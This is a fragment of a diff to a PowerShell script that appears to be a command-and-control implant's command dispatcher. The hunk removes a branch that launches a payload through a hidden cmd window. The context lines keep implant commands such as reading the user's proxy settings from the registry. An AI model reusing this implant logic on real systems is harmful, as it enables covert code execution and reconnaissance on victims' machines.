@@ -993,10 +993,6 @@ param
                 $pscommand = 'fvdsghfdsyyh'
                 }
             }
-            if ($pscommand -eq 'StartAnotherImplant') 
-            {
-                $pscommand = 'start-process -windowstyle hidden cmd -args "/c $payload"'
-            }
             if ($pscommand.ToLower().StartsWith('get-proxy')) 
             {
                 $pscommand = 'Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"'
